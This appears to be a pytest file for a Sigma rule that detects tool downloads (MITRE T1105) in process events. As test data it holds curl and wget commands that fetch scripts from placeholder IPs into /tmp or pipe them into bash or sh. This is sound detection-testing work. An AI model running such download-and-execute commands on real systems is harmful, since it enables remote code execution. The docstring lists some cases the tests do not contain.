"""Tests for the T1105 Ingress Tool Transfer Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1105_ingress_tool_transfer.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- curl -o /tmp/x.sh from external URL                      → fires
- wget -O /tmp/x.sh from external URL                      → fires
- curl | bash (pipe-to-shell)                              → fires
- wget | sh                                                → fires
- fetch -o /tmp/x (BSD fetch with -o)                      → fires
- pip3 install curl-cli (process=curl, but pip excluded)   → does NOT fire (filter_pkg_manager: pip)
- git clone with curl-like path (process=git, excluded)    → does NOT fire (filter_pkg_manager: git)
- substring trap: process `curlcake` must NOT match (\\bcurl\\b anchors to word boundary)
- substring trap: command `bashpipe` must NOT match (\\|\\s*(ba)?sh\\b anchors pipe)
- npm install with `curl-o` substring in path              → does NOT fire (filter_pkg_manager: npm)
"""
from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "9a8b2e47-3c1f-4d6e-8a5b-7f2d4e9c1a08"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "alice",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_curl_o_write_to_disk_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/curl",
            "curl -s -o /tmp/loader.sh http://203.0.113.10/x.sh",
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_wget_O_write_to_disk_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/wget",
            "wget -q -O /tmp/loader.sh http://203.0.113.10/x.sh",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_curl_pipe_to_bash_fires() -> None:
    """Pipe-to-shell is the canonical 'fetch and execute' T1105 pattern."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/curl",
            "curl -fsSL https://203.0.113.20/install.sh | bash",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_wget_pipe_to_sh_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/wget",
            "wget -qO- https://203.0.113.30/payload.sh | sh",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_pip_install_does_not_fire() -> None:
    """pip is a legitimate package manager; even if it spawns a child curl
    internally, the process itself is pip and must be excluded."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/pip3",
            "pip3 install --upgrade curl-cli==1.0.0",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_git_clone_does_not_fire() -> None:
    """git clone pulls remote content but is a legitimate SCM tool."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/git",
            "git clone https://github.com/example/curl-loader.git",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_curlcake_does_not_match() -> None:
    """Anti-substring safety: a process named `curlcake` (which contains
    'curl' as a substring but no `\\bcurl\\b` boundary) must NOT match.
    Anchoring requires word boundary."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/local/bin/curlcake",
            "curlcake -o /tmp/loader.sh http://203.0.113.10/x.sh",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_wgetage_does_not_match() -> None:
    """Anti-substring safety: a command containing 'wgetage' (which contains
    'wget' as a substring but no `\\bwget\\b` boundary) in an option name
    must NOT match. Anchoring requires word boundary."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/curl",
            "curl --wgetage 30 -fsSL https://203.0.113.40/x.sh",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_npm_install_with_curl_substring_does_not_fire() -> None:
    """npm is excluded via filter_pkg_manager even though `curl` appears
    as a substring in the package path."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/npm",
            "npm install --save-dev curl-o-matic-loader",
        )
    )
    assert fires == []